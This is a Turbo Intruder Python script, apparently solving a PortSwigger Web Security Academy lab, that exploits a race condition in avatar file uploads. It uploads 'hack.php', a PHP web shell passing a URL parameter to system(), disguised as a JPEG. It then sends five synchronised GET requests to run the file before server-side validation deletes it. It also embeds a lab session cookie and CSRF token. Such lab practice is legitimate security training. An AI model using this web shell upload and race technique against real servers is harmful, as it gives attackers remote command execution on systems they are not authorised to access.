def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0ab300c4038f465281443ece004f007a.web-security-academy.net
Cookie: session=y12SVHQZKlNpkkQ1gwWsI6ILB5cEl0dF
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------20528446763242000101606736068
Content-Length: 522
Origin: https://0ab300c4038f465281443ece004f007a.web-security-academy.net
Referer: https://0ab300c4038f465281443ece004f007a.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

-----------------------------20528446763242000101606736068
Content-Disposition: form-data; name="avatar"; filename="hack.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
-----------------------------20528446763242000101606736068
Content-Disposition: form-data; name="user"

wiener
-----------------------------20528446763242000101606736068
Content-Disposition: form-data; name="csrf"

wqVmWOSdGHzz1tgINtDY2QmRme64DAj4
-----------------------------20528446763242000101606736068--
'''

    request2 = '''GET /files/avatars/hack.php HTTP/2
Host: 0ab300c4038f465281443ece004f007a.web-security-academy.net
Cookie: session=y12SVHQZKlNpkkQ1gwWsI6ILB5cEl0dF
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab300c4038f465281443ece004f007a.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)